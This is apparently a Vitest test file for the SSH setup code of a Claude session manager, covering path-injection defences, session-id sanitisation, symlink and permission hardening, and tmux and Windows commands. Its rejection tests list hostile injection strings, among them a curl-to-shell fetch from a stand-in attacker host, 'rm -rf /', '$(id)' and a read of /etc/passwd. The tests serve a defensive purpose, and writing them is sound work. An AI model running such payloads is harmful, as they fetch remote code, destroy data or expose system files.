import { describe, it, expect, vi } from 'vitest'
import { readFileSync } from 'fs'

// P7.8: getConductorMcpPort returns 0 unless the server has actually bound,
// which never happens in the test sandbox. Mock to a non-zero port so the
// setup-script tests below exercise the `hasVision=true` branch (writes
// canonical SSE schema + cccSessionId URL bake). One test below
// explicitly flips to 0 to cover the empty-mcpServers branch.
let mockedConductorMcpPort = 19333
vi.mock('../../../../src/main/conductor-mcp-server', () => ({
  getConductorMcpPort: () => mockedConductorMcpPort,
  // GHSA-q83v: the remote config now carries HMAC(secret, sessionId), not the
  // raw secret. Deterministic session-specific stub so the assertion proves
  // THIS session's token is baked in.
  mcpSessionToken: (sessionId: string) => `tok-${sessionId}`,
}))

import { ClaudeProvider } from '../../../../src/main/providers/claude'
import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand, buildTmuxBinPatchCommand, buildRemoteTmuxKillCommand, generateWindowsRemoteSetupScript, getWindowsRemoteSetupCommand, buildWindowsClaudeCommand } from '../../../../src/main/providers/claude/ssh-shim'

// #242 finding F1 (b): generateRemoteSetupScript/getRemoteSetupCommand/
// configureRemoteSettings now require a nonce.
const NONCE = 'testnonce123abc'

describe('ClaudeProvider SSH-capable surface', () => {
  it('configureRemoteSettings produces a base64-piped node command', () => {
    const p = new ClaudeProvider()
    const cmd = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
    expect(cmd).toContain('base64 -d | node')
    // `cd --` defends against a path that begins with a dash being parsed as a flag.
    expect(cmd).toContain('cd -- ~/repo')
  })

  it('getSshSettingsPath returns ~/.claude/settings-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid-1')).toBe('~/.claude/settings-sid-1.json')
  })

  it('sanitizes session id in settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid/with*bad:chars')).toBe('~/.claude/settings-sid_with_bad_chars.json')
  })

  // P7.8 -- per-session --mcp-config path mirrors --settings path layout
  it('getSshMcpConfigPath returns ~/.claude/mcp-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid-1')).toBe('~/.claude/mcp-sid-1.json')
  })

  it('sanitizes session id in mcp-config path the same way as settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid/with*bad:chars')).toBe('~/.claude/mcp-sid_with_bad_chars.json')
  })
})

describe('SSH remotePath injection defence', () => {
  it.each([
    '~',
    '~/repo',
    '~user/work',
    '/home/me/project',
    './rel/path',
    '/srv/foo-bar_1.2',
  ])('accepts safe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).not.toThrow()
  })

  it.each([
    '~; curl attacker/evil.sh | sh #',
    '~ && rm -rf /',
    '`whoami`',
    '$(id)',
    '~/repo;ls',
    '~/repo|cat /etc/passwd',
    '~/repo with space',
    "~/'quote'",
    '~/"dquote"',
    '~/path\nNL',
    '~/repo>out',
  ])('rejects unsafe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand throws on a metacharacter-laden remotePath rather than interpolating it', () => {
    expect(() =>
      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null, undefined, NONCE),
    ).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand uses `cd --` so a leading-dash path is treated as an operand', () => {
    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null, undefined, NONCE)
    expect(cmd).toContain(' cd -- ~/repo ')
  })
})

describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
  it('writes a per-session mcp-config file with the canonical SSE schema and conductor key', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // Path: ~/.claude/mcp-<sid>.json
    expect(script).toContain(`path.join(claudeDir,'mcp-sid-x.json')`)
    // The mcpConfig literal is JSON-stringified twice (once for the JSON
    // content, once for embedding as a JS string literal in the script),
    // so quotes appear as \" in the script source. Match the escaped form.
    expect(script).toContain('\\"conductor\\"')
    expect(script).toContain('\\"type\\":\\"sse\\"')
    // Old name absent from the mcp-config WRITE literal -- only present
    // in the strip-legacy cleanup code further down. Pin via the
    // writeFileSync(mcpPath, ...) literal so the assertion can't be
    // satisfied by an unrelated reference to 'conductor' elsewhere in
    // the script.
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('conductor')
    expect(writeMatch![0]).not.toContain('conductor-vision')
  })

  it('bakes ?cccSessionId=<encoded sid> into the remote MCP URL (P7.7.10 parity)', () => {
    const script = generateRemoteSetupScript('sid+with space', null, undefined, NONCE)
    // encodeURIComponent maps "+" -> "%2B" and " " -> "%20"
    expect(script).toContain('?cccSessionId=sid%2Bwith%20space')
  })

  it('bakes this session\'s per-session token into the remote MCP URL (GHSA-q83v)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain('&token=tok-sid-x')
  })

  // #242 finding F2 (MAJOR, adversarial review round 5): ssh-shim.ts:200
  // used to interpolate the RAW sessionId into statusLine.command -- the one
  // embedding that skipped `safeSid`, unlike settings-<safeSid>.json and
  // mcp-<safeSid>.json below it. Reachability is gated at the IPC boundary
  // (sessionIdSchema, see pty-handlers-sessionid.test.ts) and this is
  // hardening on the same footing as the #241 username/host fix, not an
  // embargoed vulnerability -- but the sink itself must still use safeSid.
  // Mutation to prove this can fail: revert ssh-shim.ts:200's
  // `${safeSid}` back to `${sessionId}` -- the raw hostile id then appears
  // verbatim in the statusLine.command string and this assertion fails.
  it('never embeds a raw hostile sessionId in statusLine.command -- always the sanitised safeSid', () => {
    const hostile = 'x;id'
    const script = generateRemoteSetupScript(hostile, null, undefined, NONCE)
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgBody = parts[1].split('})')[0]
    expect(sesCfgBody).not.toContain(hostile)
    expect(sesCfgBody).toContain('CLAUDE_MULTI_SESSION_ID=x_id')
  })

  it('strips BOTH legacy conductor-vision AND conductor entries from shared settings + ~/.claude.json', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // Shared settings.json: both keys defensively removed
    expect(script).toContain(`s.mcpServers['conductor-vision']`)
    expect(script).toContain(`s.mcpServers['conductor']`)
    expect(script).toContain(`delete s.mcpServers['conductor-vision']`)
    expect(script).toContain(`delete s.mcpServers['conductor']`)
    // ~/.claude.json cleanup also defensive on both names
    expect(script).toContain(`c.mcpServers['conductor-vision']`)
    expect(script).toContain(`c.mcpServers['conductor']`)
  })

  it('per-session settings file does NOT carry mcpServers (claude ignores it there)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // The clone deletes mcpServers before applying CCC overrides.
    expect(script).toContain(`delete sBase.mcpServers`)
    // sesCfg construction merges sBase + statusLine + (optional hooks); no
    // mcpServers key is added back -- assert no literal mcpServers in the
    // per-session settings write path. Require the anchor match to succeed
    // so a future refactor that renames sBase or reformats spacing fails
    // loudly rather than turning the assertion into a silent no-op.
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine.length).toBeGreaterThan(0)
    expect(sesCfgLine).not.toContain('mcpServers')
  })

  // Master status-line switch (onboarding p4): includeStatusLine=false must
  // omit the statusLine stanza from the per-session settings while leaving
  // the rest of the setup (hooks, mcp, legacy cleanup) intact.
  it('includes the statusLine stanza by default', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  // #265 finding 3: the sessionId embedded in the statusLine `command` was the
  // one raw-value path left in this file. That value lands inside a
  // single-quoted JS string literal in the emitted setup script AND becomes the
  // command claude runs via `sh -c`, so a raw id with a quote/space/
  // metacharacter is remote code execution / command splitting. It must be the
  // sanitised safeSid (a no-op for real hex ids).
  // #242 inserts `CCC_TMUX_BIN=...` between the sid and ` node`, so assert on
  // the sanitised sid token followed by a space (the env-var boundary), not the
  // literal `<sid> node` adjacency the pre-#242 command had.
  it('embeds the sanitised safeSid — not the raw id — in the statusLine command', () => {
    const script = generateRemoteSetupScript("a'b", null, undefined, NONCE)
    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=a_b ')
    expect(script).not.toContain("CLAUDE_MULTI_SESSION_ID=a'b")
  })

  it('leaves a real (hex) id untouched in the statusLine command', () => {
    const script = generateRemoteSetupScript('9f1f147ea02f2cf7d1eec041', null, undefined, NONCE)
    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=9f1f147ea02f2cf7d1eec041 ')
  })

  it('includeStatusLine=false omits the statusLine stanza from the per-session settings', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine).not.toContain('statusLine')
    // The shim file is still staged (inert without the stanza) and the
    // legacy-global cleanup still runs.
    expect(script).toContain('conductor-ssh-statusline.js')
  })

  // Master-off + legacy remote: the per-session clone must strip a legacy
  // shared statusLine stanza BEFORE the clone is written, or the first
  // post-upgrade connect inherits it despite the master being off (the
  // shared-file heal runs after the clone is taken).
  it('strips a legacy statusLine stanza from the sBase clone itself', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
    expect(script).toContain('delete sBase.statusLine')
    // Ordering: the sBase strip appears before the per-session settings write.
    expect(script.indexOf('delete sBase.statusLine')).toBeLessThan(script.indexOf('sesPath'))
  })

  it('configureRemoteSettings threads the master-switch opts through to the script', () => {
    const p = new ClaudeProvider()
    const on = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
    const off = p.configureRemoteSettings('sid-x', '~/repo', null, { includeStatusLine: false }, NONCE)
    expect(on).not.toBe(off)
  })

  // Built-in tools master (onboarding p6): off = empty remote mcpServers,
  // exactly like the port-0 fallback; statusline is independent of this flag.
  it('includeConductorMcp=false writes empty remote mcpServers (no built-in tools)', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeConductorMcp: false }, NONCE)
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
    expect(writeMatch![0]).not.toContain('conductor')
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  // P7.8 parity with writeLocalSessionMcpConfig: when the conductor server
  // hasn't bound yet (port=0), write an empty mcpServers object rather than
  // pointing at a phantom port. Mirrors the local writer's behaviour and
  // avoids silently dispatching SSH sessions to whatever process owns 19333.
  it('writes empty mcpServers when the conductor server has not bound (port=0)', () => {
    mockedConductorMcpPort = 0
    try {
      const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
      const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
      expect(writeMatch).not.toBeNull()
      // Empty mcpServers literal: {"mcpServers":{}} -> doubly-stringified
      // becomes the substring \"mcpServers\":{} inside the script source.
      expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
      expect(writeMatch![0]).not.toContain('conductor')
      expect(writeMatch![0]).not.toContain('cccSessionId')
    } finally {
      mockedConductorMcpPort = 19333
    }
  })
})

// GHSA-phr3-g5qh-q4v5: the remote ~/.claude is hardened even when it
// PRE-EXISTS, and the token-bearing writes cannot be redirected through a
// planted symlink. mkdir's mode is create-only, so a pre-existing 0755 dir
// (the common case) was never repaired and the rmSync->write pair followed a
// re-planted link. Both halves of the fix are asserted on the emitted script;
// each was verified to fail against the pre-fix code.
describe('SSH remote ~/.claude hardening (GHSA-phr3-g5qh-q4v5)', () => {
  it('re-asserts 0700 on the dir unconditionally, not only on mkdir create', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // The chmod must be its own statement, so a pre-existing dir is repaired.
    expect(script).toContain('fs.chmodSync(claudeDir,0o700)')
    // And it must come before any write into the dir, so the writes land in an
    // already-locked-down directory (the shim write is the first).
    expect(script.indexOf('fs.chmodSync(claudeDir,0o700)')).toBeLessThan(script.indexOf('writeFileSync(shimPath'))
  })

  it('creates BOTH token-bearing files exclusively (flag wx), refusing a re-planted link', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // settings-<sid>.json (hook token) and mcp-<sid>.json (?token= secret):
    // exclusive create so a symlink planted in the rmSync->write window is
    // refused with EEXIST rather than followed.
    expect(script).toMatch(/fs\.writeFileSync\(sesPath,[^;]*,\{mode:0o600,flag:'wx'\}\)/)
    expect(script).toMatch(/fs\.writeFileSync\(mcpPath,[^;]*,\{mode:0o600,flag:'wx'\}\)/)
    // The unlink stays as the legitimate-leftover path, paired with each write.
    expect(script).toContain(`fs.rmSync(sesPath,{force:true})`)
    expect(script).toContain(`fs.rmSync(mcpPath,{force:true})`)
  })

  it('does not claim the mkdir mode alone blocks a planted link (comment corrected)', () => {
    // The old inline comment asserted "the 0700 dir blocks a planted link",
    // which is false for a pre-existing dir. It is source-only, but pin it so
    // the overstatement cannot quietly return.
    const src = readFileSync(
      new URL('../../../../src/main/providers/claude/ssh-shim.ts', import.meta.url),
      'utf8',
    )
    expect(src).not.toContain('the 0700 dir blocks a planted link')
  })
})

// #242 finding F3 (MAJOR, adversarial review round 5): after a tier-3/4
// stage/push succeeds, pty-manager must rewrite the ALREADY-WRITTEN
// settings-<safeSid>.json's CCC_TMUX_BIN before the claude launch write --
// see buildTmuxBinPatchCommand's doc comment for the full mechanism.
//
// #242 finding F1(a), round-2 correction: buildTmuxBinPatchCommand no longer
// takes a `tmuxBin` parameter -- the emitted script computes
// `path.join(os.homedir(),'.claude','bin','tmux')` itself, evaluated on the
// REMOTE at runtime, rather than trusting a host-supplied value that
// ultimately traces back to a wire-reported (and therefore
// attacker-influenceable) path.
describe('buildTmuxBinPatchCommand (#242 finding F3)', () => {
  it('produces a base64-piped node command', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    expect(cmd).toMatch(/^echo '[A-Za-z0-9+\/=]+' \| base64 -d \| node 2>\/dev\/null$/)
  })

  it('decodes to a script that reads settings-<safeSid>.json and rewrites CCC_TMUX_BIN in place, computed from the REMOTE os.homedir()', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    expect(m).not.toBeNull()
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`'settings-sid-x.json'`)
    expect(decoded).toContain('CCC_TMUX_BIN=')
    expect(decoded).toContain(`path.join(os.homedir(),'.claude','bin','tmux')`)
    expect(decoded).toContain('statusLine.command')
  })

  // #242 finding I4: the computed tmuxBin is real remote output
  // (os.homedir()), not wire-controlled, but its sibling in
  // generateRemoteSetupScript (the `tmuxPath` guard) re-checks the identical
  // class of value against the SAME allowlist right before the SAME sink
  // (statusLine.command) -- this patch script must apply the SAME guard,
  // and skip the whole patch (leaving whatever CCC_TMUX_BIN was already
  // baked in) rather than splice an unguarded value into the sink.
  it('applies the SAME charset guard as generateRemoteSetupScript before splicing tmuxBin into statusLine.command', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
    const guardIdx = decoded.indexOf(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
    const replaceIdx = decoded.indexOf('statusLine.command=')
    expect(guardIdx).toBeGreaterThan(-1)
    expect(replaceIdx).toBeGreaterThan(-1)
    expect(guardIdx).toBeLessThan(replaceIdx)
    // The replace itself is gated on a non-empty tmuxBin -- a failed guard
    // must skip the patch entirely, not write an empty CCC_TMUX_BIN=.
    expect(decoded).toContain(`if(tmuxBin&&s.statusLine&&typeof s.statusLine.command==='string')`)
  })

  it('sanitizes a hostile sessionId into the same safeSid form the settings filename uses', () => {
    const cmd = buildTmuxBinPatchCommand('x;id')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`'settings-x_id.json'`)
    expect(decoded).not.toContain('x;id')
  })

  it('is deterministic for the same input', () => {
    expect(buildTmuxBinPatchCommand('sid-x')).toBe(
      buildTmuxBinPatchCommand('sid-x'),
    )
  })
})

// #242 MAJOR: tier 1/2 tmux detection had ZERO coverage -- reverting the
// entire hunk (dropping both probes, restoring the bare `setup ok\n`
// sentinel) left the full suite green. Pin each piece individually.
describe('SSH remote setup script -- tmux detection (#242)', () => {
  it('probes PATH via the `command -v tmux` shell builtin (tier 1)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`execSync('command -v tmux'`)
  })

  it('falls back to ~/.claude/bin/tmux with an X_OK access check (tier 2)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`path.join(claudeDir,'bin','tmux')`)
    expect(script).toContain('fs.constants.X_OK')
  })

  it('ends the script with the tmux-carrying sentinel, not the bare "setup ok"', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // #242 round-3 correction (I3): the sentinel carries a fixed CLASS
    // (`tmuxClass`), never `tmuxPath` -- there is no wire-reported path left
    // for tier 1/2 to influence a launch command with.
    expect(script).toContain(`process.stdout.write('setup ok ${NONCE} tmux='+tmuxClass+'`)
    // The pre-#242 bare sentinel wrote exactly 'setup ok\n' with nothing
    // else on the line -- assert that exact literal is gone, not merely
    // that the new one was added alongside it.
    expect(script).not.toContain(`process.stdout.write('setup ok\\n')`)
  })
})

// #242 MAJOR: the statusline shim's OSC sentinel would otherwise be
// swallowed by tmux (the pane pty needs allow-passthrough+DCS to forward an
// unrecognised OSC to the client, which is not configured). The shim
// instead bypasses tmux by asking the server for the attached client's tty.
describe('SSH statusline shim -- tmux client-tty bypass (#242)', () => {
  it('embeds a $TMUX branch that asks the tmux server for #{client_tty}', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain('process.env.TMUX')
    expect(script).toContain('#{client_tty}')
    expect(script).toContain('display-message')
  })
})

// SSH tmux enhancement (item 4): buildRemoteTmuxKillCommand — the remote
// command run over the SEPARATE end-remote exec. Verified end-to-end on 185.
describe('buildRemoteTmuxKillCommand (item 4)', () => {
  it('kills the ccc-<safeSid> session across every known tmux location and removes both sidecars', () => {
    const cmd = buildRemoteTmuxKillCommand('sess-1')
    // Targets the tmux session name, mirroring buildTmuxLaunchCommand.
    expect(cmd).toContain('kill-session -t ccc-sess-1')
    // Tries PATH + both Homebrew prefixes (macOS non-login exec has a minimal
    // PATH, so `command -v tmux` alone would miss /opt/homebrew/bin) + system +
    // the CCC-staged tier-2 binary.
    expect(cmd).toContain('tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/opt/homebrew/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/usr/local/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('/usr/bin/tmux kill-session -t ccc-sess-1')
    expect(cmd).toContain('"$HOME/.claude/bin/tmux" kill-session -t ccc-sess-1')
    // Removes the two per-session sidecars.
    expect(cmd).toContain('rm -f ~/.claude/settings-sess-1.json ~/.claude/mcp-sess-1.json')
    // Every step best-effort; the whole exec still exits 0.
    expect(cmd.trim().endsWith('true')).toBe(true)
  })
  it('sanitizes a session id with shell metacharacters into the -t argument', () => {
    const cmd = buildRemoteTmuxKillCommand('a;b c$(x)')
    expect(cmd).toContain('kill-session -t ccc-a_b_c__x_')
    // No raw metacharacter reaches the target token.
    expect(cmd).not.toContain('ccc-a;b')
  })
})

// SSH tmux enhancement (item 3): Windows remote setup — PROTOTYPE. Verified on
// Hyper-V (setup sentinel + statusline shim reaching the client).
describe('generateWindowsRemoteSetupScript (item 3)', () => {
  const NONCE = 'winnonce123'
  it('emits a tmux=none sentinel with the account descriptor (no tmux on Windows)', () => {
    const script = generateWindowsRemoteSetupScript('winsid', { includeStatusLine: true, includeConductorMcp: true }, NONCE)
    expect(script).toContain(`process.stdout.write('setup ok ${NONCE} tmux=none acct='+acctB64+'`)
    // No tmux detection at all (no `command -v tmux`, no accessSync bin probe).
    expect(script).not.toContain('command -v tmux')
    // Reads the account the SAME way the POSIX path does.
    expect(script).toContain("Buffer.from(c.oauthAccount.emailAddress,'utf-8').toString('base64')")
  })
  it('bakes a Windows statusLine command that passes the session id via argv (cmd.exe cannot env-prefix)', () => {
    const script = generateWindowsRemoteSetupScript('winsid', { includeStatusLine: true }, NONCE)
    // `node "<shimPath>" <safeSid>` — shimPath JSON.stringify'd at runtime.
    expect(script).toContain(`command:'node '+JSON.stringify(shimPath)+' winsid'`)
  })
  it('rejects a bad nonce (charset guard, fail-closed like the POSIX generator)', () => {
    expect(() => generateWindowsRemoteSetupScript('winsid', undefined, 'bad nonce!')).toThrow(/charset guard/)
  })
})

describe('getWindowsRemoteSetupCommand (item 3 — cmd.exe delivery)', () => {
  it('delivers via powershell -Command with a single base64 payload that fits cmd.exe 8191 limit', () => {
    const cmd = getWindowsRemoteSetupCommand('winsid', { includeStatusLine: true, includeConductorMcp: true }, 'winnonce123')
    expect(cmd.startsWith('powershell -NoProfile -NonInteractive -Command "')).toBe(true)
    // NOT -EncodedCommand (double-base64 would blow past the cmd line limit).
    expect(cmd).not.toContain('-EncodedCommand')
    expect(cmd).toContain('FromBase64String')
    expect(cmd).toContain('|node')
    // The -Command payload MUST contain NO `$`: a PowerShell login shell expands
    // any $var inside the double-quoted argument before the child runs, and the
    // earlier `$ProgressPreference=…;$s=…;$s|node` form had $s expanded to empty
    // -> `;|node` ParserError, so setup silently never ran (adversarial review,
    // 2026-08-18). Mutation to prove this can fail: reintroduce a `$` anywhere in
    // the -Command string.
    expect(cmd).not.toContain('$')
    // Well under cmd.exe's 8191-char command-line limit (measured ~4.8k on Hyper-V).
    expect(cmd.length).toBeLessThan(8191)
  })
})

describe('buildWindowsClaudeCommand (item 3 — cmd.exe launch)', () => {
  it('uses cmd set-syntax env vars and %USERPROFILE% settings/mcp paths', () => {
    const cmd = buildWindowsClaudeCommand({
      sessionId: 'winsid',
      envPrefixVars: ['CLAUDE_CODE_DISABLE_MOUSE_CLICKS=1', 'CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1'],
      extraFlags: '--effort high',
      continueFlag: '--continue',
    })
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_MOUSE_CLICKS=1"&& ')
    expect(cmd).toContain('set "CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1"&& ')
    expect(cmd).toContain('claude --settings "%USERPROFILE%\\.claude\\settings-winsid.json"')
    expect(cmd).toContain('--mcp-config "%USERPROFILE%\\.claude\\mcp-winsid.json"')
    expect(cmd).toContain('--effort high')
    expect(cmd).toContain('--continue')
    // POSIX `~` never appears (does not expand in cmd.exe).
    expect(cmd).not.toContain('~/.claude')
  })
  it('omits empty flags (no double spaces, no stray --continue on a first connect)', () => {
    const cmd = buildWindowsClaudeCommand({ sessionId: 'winsid', envPrefixVars: [], extraFlags: '', continueFlag: '' })
    expect(cmd).toContain('claude --settings')
    expect(cmd).not.toContain('--continue')
    expect(cmd).not.toContain('  ')
  })
})
